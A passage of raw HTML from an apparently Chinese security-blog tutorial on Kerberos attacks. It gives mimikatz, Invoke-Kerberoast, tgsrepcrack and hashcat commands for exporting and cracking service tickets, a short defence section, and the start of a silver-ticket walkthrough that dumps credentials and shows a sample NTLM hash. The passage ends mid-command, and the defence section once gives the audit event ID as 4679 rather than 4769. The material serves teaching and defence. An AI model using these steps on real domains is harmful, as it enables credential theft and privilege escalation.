src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/23_WKiaibHVA3glTwFwtvU7nibWnE51cQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIv0NLsRxUITRKCxlA1xia8xKHibZiaaWKiaibHVA3glTwFwtvU7nibWnE51cQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="629" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里输入jack的密码<br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">导出票据</strong><br style="-webkit-tap-highlight-color: transparent;"  />首先是查看</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">klist</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">或</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"kerberos::list"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">MSF</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">里面</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">load kiwi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos_ticket_list</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">或</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">load kiwi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kiwi_cmd kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">list</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">1.mimikatz导出</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"kerberos::list /export"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"exit"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行完后，会在mimikatz同目录下导出 后缀为kirbi的票据文件<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4775233248515691" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/24_1CoB1XsLPD3mwgCktqAjvhHGssl37w.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUUbWWYDTIzcW0ACiapOJWB7zR1CoB1XsLPD3mwgCktqAjvhHGssl37w/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1179" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />2.Empire下的Invoke-Kerberoast.ps1</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Kerberoast</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Kerberoast</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">outputFormat </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Hashcat</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5661538461538461" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/25_Axw4MAsAZdKBXxzTpiaYLfrzRz01LA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI9gpofy4zIVqACdGetGLyuLBuOAxw4MAsAZdKBXxzTpiaYLfrzRz01LA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="650" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">离线破解服务票据</strong><br style="-webkit-tap-highlight-color: transparent;"  />1.kerberoast中的tgsrepcrack.py</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python2 tgsrepcrack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py password</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt xx</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.20268872802481902" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/26_GRUkYCcoScr1T67EvZw4QWRU0mCkhw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaImCzsMmXibahvCBWAx4ytfxWxhGRUkYCcoScr1T67EvZw4QWRU0mCkhw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="967" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />2.hashcat<br style="-webkit-tap-highlight-color: transparent;"  />将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">hashcat </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">m  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">13100</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  hash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">pass</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">Kerberoast攻击防范</strong><br style="-webkit-tap-highlight-color: transparent;"  />确保服务账号密码为强密码(长度、随机性、定期修改)<br style="-webkit-tap-highlight-color: transparent;"  />如果攻击者无法将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，就无法实验 tgsrepcrack.py来破解密码。<br style="-webkit-tap-highlight-color: transparent;"  />攻击者可以通过嗅探的方法抓取Kerberos TGS票据。因此，如果强制实验AES256_HMAC方式对Kerberos票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性。<br style="-webkit-tap-highlight-color: transparent;"  />许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。<br style="-webkit-tap-highlight-color: transparent;"  />在进行日志审计时，可以重点关注ID为4679(请求Kerberos服务票据)的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.白银票据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />要创建白银票据，我们需要知道以下信息：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>要伪造的域用户(这里我们一般填写域管理员账户)</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域的SID值(就是域成员SID值去掉最后的)</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>目标服务的FQDN</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>可利用的服务</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>服务账号的NTLM哈希</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />这里使用白银票据伪造CIFS服务，该通常用于Windows主机之间的文件共享。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">1.mimikatz获得服务账号的ntlm hash</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sekurlsa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">logonpasswords</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.49874266554903607" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/27_RzzT69vICBTvpxU8qWEol1xPzBSuWQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIPBNlDgA67DfvInJUQSUjLIfORzzT69vICBTvpxU8qWEol1xPzBSuWQ/640?wx_fmt=png'" data-type="png" data-w="1193" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />得到NTLM为: 2c268a2a643267a4204a6ef6f896446b<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />2.使用白银票据攻击<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">golden </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sid</span><span 